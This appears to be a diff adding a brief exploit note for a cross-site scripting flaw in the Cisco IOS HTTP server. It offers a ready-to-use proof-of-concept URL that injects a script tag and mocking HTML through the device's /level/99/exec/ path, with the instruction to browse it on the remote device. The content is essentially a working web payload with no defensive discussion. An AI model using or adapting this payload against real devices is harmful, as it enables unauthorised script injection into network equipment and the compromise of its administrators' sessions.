@@ -1,0 +1,4 @@
+Cisco IOS HTTP XSS vulnerability.
+Just browse this URL on the remote device 
+http://192.168.0.1/level/99/exec/-/<script>alert('CiSCO%20SuCKz!')</script><p><h1>CISCO%20SUCKS</h1></p>
+
